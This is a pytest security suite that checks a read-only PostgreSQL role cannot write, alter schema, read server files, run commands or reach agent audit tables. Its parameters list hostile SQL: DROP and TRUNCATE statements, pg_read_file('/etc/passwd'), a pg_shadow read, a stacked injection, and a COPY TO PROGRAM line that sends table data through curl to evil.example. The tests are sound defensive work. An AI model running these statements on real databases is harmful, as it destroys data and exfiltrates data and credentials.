"""The read-only role must be unable to do damage.

**These tests pass when the database refuses.** A green suite that never
attempted a write proves nothing, which is why every assertion here is a
denial rather than a success.

This is the Stage 1 gate. A failure means the containment claim in
docs/operations/SECURITY.md is false, and it blocks release.
"""

from __future__ import annotations

import psycopg
import pytest

pytestmark = [pytest.mark.security, pytest.mark.integration]

# Two independent mechanisms deny a write, and either may fire first:
#   - the grant is absent            -> InsufficientPrivilege (42501)
#   - default_transaction_read_only  -> ReadOnlySqlTransaction (25006)
# Accepting both is correct. Asserting only one would make the test brittle
# against a change that is still safe. The "grants are genuinely absent" claim
# is proven separately below, so read-only mode cannot mask a missing revoke.
Denied = (psycopg.errors.InsufficientPrivilege, psycopg.errors.ReadOnlySqlTransaction)

type Conn = psycopg.Connection[tuple[object, ...]]


@pytest.mark.parametrize(
    "statement",
    [
        "INSERT INTO public.orders (total_amount) VALUES (1)",
        "UPDATE public.orders SET total_amount = 0",
        "DELETE FROM public.orders",
        "TRUNCATE public.orders",
    ],
    ids=["insert", "update", "delete", "truncate"],
)
def test_data_modification_is_denied(ro_connection: Conn, statement: str) -> None:
    with pytest.raises(Denied):
        ro_connection.execute(statement)  # type: ignore[arg-type]


@pytest.mark.parametrize(
    "statement",
    [
        "CREATE TABLE public.evil (id int)",
        "DROP TABLE public.orders",
        "ALTER TABLE public.orders ADD COLUMN x int",
        "CREATE INDEX evil_ix ON public.orders (id)",
        "CREATE SCHEMA evil",
    ],
    ids=["create-table", "drop-table", "alter-table", "create-index", "create-schema"],
)
def test_schema_modification_is_denied(ro_connection: Conn, statement: str) -> None:
    with pytest.raises(Denied):
        ro_connection.execute(statement)  # type: ignore[arg-type]


@pytest.mark.parametrize(
    "statement",
    [
        "SELECT pg_read_file('/etc/passwd')",
        "SELECT pg_ls_dir('/')",
        "SELECT pg_read_binary_file('/etc/passwd')",
        "COPY public.orders TO PROGRAM 'curl https://evil.example -d @-'",
    ],
    ids=["pg_read_file", "pg_ls_dir", "pg_read_binary_file", "copy-to-program"],
)
def test_server_filesystem_and_command_access_is_denied(
    ro_connection: Conn, statement: str
) -> None:
    """The half everyone forgets.

    Blocking INSERT is obvious. A SELECT-only role that can still call
    pg_read_file can read files off the database host, and COPY ... TO PROGRAM
    executes commands. A role with those reachable is not a read-only role.

    These are superuser-only by default, so this suite is really asserting two
    things: that the predefined roles pg_read_server_files and
    pg_execute_server_program were never granted, and that the application is
    not running as a superuser -- which would silently undo all of it.
    """
    with pytest.raises(Denied):
        ro_connection.execute(statement)  # type: ignore[arg-type]


@pytest.mark.parametrize(
    "statement",
    [
        "SELECT * FROM agent_meta.query_audit",
        "SELECT * FROM agent_meta.sessions",
        "SELECT * FROM agent_meta.session_turns",
        "SELECT * FROM agent_meta.schema_elements",
    ],
    ids=["audit", "sessions", "turns", "embeddings"],
)
def test_agent_metadata_is_unreachable(ro_connection: Conn, statement: str) -> None:
    """Generated SQL must not be able to read the audit trail that records it,
    nor prior sessions, nor the retrieval corpus."""
    with pytest.raises(Denied):
        ro_connection.execute(statement)  # type: ignore[arg-type]


def test_password_hashes_are_unreachable(ro_connection: Conn) -> None:
    with pytest.raises(Denied):
        ro_connection.execute("SELECT * FROM pg_shadow")  # type: ignore[arg-type]


def test_stacked_statements_are_denied(ro_connection: Conn) -> None:
    """The SQL-injection shape: a benign statement followed by a hostile one.

    The AST validator rejects this earlier, but the database must refuse it too
    -- defence in depth, and execute_sql cannot assume its caller validated.
    """
    with pytest.raises(Denied):
        ro_connection.execute("SELECT 1; DROP TABLE public.orders")  # type: ignore[arg-type]


# --- the checks that read-only transaction mode cannot mask -----------------


@pytest.mark.parametrize("privilege", ["INSERT", "UPDATE", "DELETE", "TRUNCATE"])
def test_write_privileges_are_genuinely_absent(ro_connection: Conn, privilege: str) -> None:
    """Prove the grant is missing, not merely blocked by read-only mode.

    Without this, someone could revert the GRANT changes, leave
    default_transaction_read_only on, and every denial test above would still
    pass -- while a single `SET transaction_read_write` would open the door.
    """
    row = ro_connection.execute(
        "SELECT has_table_privilege('public.orders', %s)", (privilege,)
    ).fetchone()

    assert row is not None
    assert row[0] is False, f"read-only role unexpectedly holds {privilege} on public.orders"


def test_read_privilege_is_present(ro_connection: Conn) -> None:
    """The counterpart: containment must not have broken the actual use case."""
    row = ro_connection.execute("SELECT has_table_privilege('public.orders', 'SELECT')").fetchone()

    assert row is not None
    assert row[0] is True


def test_role_is_not_a_superuser(ro_connection: Conn) -> None:
    """A superuser bypasses every grant, and the suite above would still pass."""
    row = ro_connection.execute(
        "SELECT rolsuper, rolbypassrls, rolcreatedb, rolcreaterole "
        "FROM pg_roles WHERE rolname = current_user"
    ).fetchone()

    assert row is not None
    assert row == (False, False, False, False)


@pytest.mark.parametrize(
    "predefined_role",
    ["pg_read_server_files", "pg_write_server_files", "pg_execute_server_program"],
)
def test_dangerous_predefined_roles_are_not_granted(
    ro_connection: Conn, predefined_role: str
) -> None:
    """Membership in any of these re-opens filesystem or command access."""
    row = ro_connection.execute(
        "SELECT pg_has_role(current_user, %s, 'MEMBER')", (predefined_role,)
    ).fetchone()

    assert row is not None
    assert row[0] is False, f"read-only role is a member of {predefined_role}"


def test_statement_timeout_is_set_on_the_role(ro_connection: Conn) -> None:
    """Set on the role, not just per-connection, so a caller that forgets to
    apply it still gets the ceiling."""
    row = ro_connection.execute("SHOW statement_timeout").fetchone()

    assert row is not None
    assert row[0] == "30s"


def test_transactions_default_to_read_only(ro_connection: Conn) -> None:
    row = ro_connection.execute("SHOW default_transaction_read_only").fetchone()

    assert row is not None
    assert row[0] == "on"
